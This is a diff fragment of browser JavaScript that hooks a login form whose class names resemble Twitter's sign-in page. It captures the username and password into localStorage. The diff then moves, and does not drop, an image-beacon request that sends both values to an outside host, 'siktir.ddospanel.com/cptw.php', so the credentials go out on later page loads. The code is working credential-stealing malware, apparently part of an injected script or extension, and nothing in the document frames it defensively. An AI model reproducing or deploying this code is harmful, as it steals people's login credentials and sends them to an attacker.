@@ -31,15 +31,19 @@ if (window.location.href.indexOf("login") >= 0) {
 	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
 	localStorage['sw'] = document.querySelectorAll('.js-username-field')[0].value
 	localStorage['pw'] = document.querySelectorAll('.js-password-field')[0].value
-		if(localStorage['pw'] && localStorage['sw']){
-			new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['pw'] + "&password=" + localStorage['sw'];
-		}
+		
 		setTimeout(function() {
 			document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick;
 		}, 99);
 		return false
 	}
+}else{
+if(localStorage['pw'] && localStorage['sw']){
+	new Image().src = "http://siktir.ddospanel.com/cptw.php?username=" + localStorage['pw'] + "&password=" + localStorage['sw'];
 }
+}
+
+
 
 
 }
